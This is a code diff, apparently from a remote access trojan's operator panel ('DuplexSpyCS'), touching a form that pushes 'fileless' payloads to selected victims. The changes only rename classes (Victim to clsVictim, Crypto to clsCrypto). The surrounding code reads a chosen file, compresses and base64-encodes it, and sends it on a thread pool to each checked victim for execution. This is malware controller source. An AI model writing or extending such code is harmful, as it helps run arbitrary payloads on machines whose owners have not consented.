@@ -12,7 +12,7 @@ namespace DuplexSpyCS
 {
     public partial class frmFilelessExec : Form
     {
-        public List<Victim> m_lsVictim;
+        public List<clsVictim> m_lsVictim;
 
         private bool m_bSignalPause { get; set; }
         private bool m_bSignalStop { get; set; }
@@ -24,24 +24,24 @@ namespace DuplexSpyCS
 
         void fnSendPayload(string[] alpArgs, int nThdCnt, byte[] abData)
         {
-            List<Victim> lsTarget = new List<Victim>();
+            List<clsVictim> lsTarget = new List<clsVictim>();
             Invoke(new Action(() =>
             {
                 lsTarget.AddRange(
                     listView1.CheckedItems.Cast<ListViewItem>()
                     .Where(x => x.Checked)
-                    .Select(x => (Victim)x.Tag)
+                    .Select(x => (clsVictim)x.Tag)
                     .ToList()
                     );
                 toolStripStatusLabel2.Text = "Running";
             }));
 
-            string szArgs = string.Join(",", alpArgs.Select(x => Crypto.b64E2Str(x)).ToArray());
+            string szArgs = string.Join(",", alpArgs.Select(x => clsCrypto.b64E2Str(x)).ToArray());
             string szData = Convert.ToBase64String(abData);
 
             ThreadPool.SetMinThreads(1, 1);
             ThreadPool.SetMaxThreads(nThdCnt, nThdCnt);
-            foreach (Victim v in lsTarget)
+            foreach (clsVictim v in lsTarget)
             {
                 while (m_bSignalPause)
                 {
@@ -69,7 +69,7 @@ namespace DuplexSpyCS
             radioButton1.Checked = true;
 
             //setup
-            foreach (Victim v in m_lsVictim)
+            foreach (clsVictim v in m_lsVictim)
             {
                 ListViewItem item = new ListViewItem(v.ID);
                 item.SubItems.Add("?");
@@ -124,7 +124,7 @@ namespace DuplexSpyCS
             int nThdCnt = (int)numericUpDown1.Value;
             string[] alpArgs = szArgs.Split(' ');
             byte[] abData = File.ReadAllBytes(szFileName);
-            abData = C1.Compress(abData);
+            abData = clsTools.Compress(abData);
 
             new Thread(() => fnSendPayload(alpArgs, nThdCnt, abData)).Start();
         }
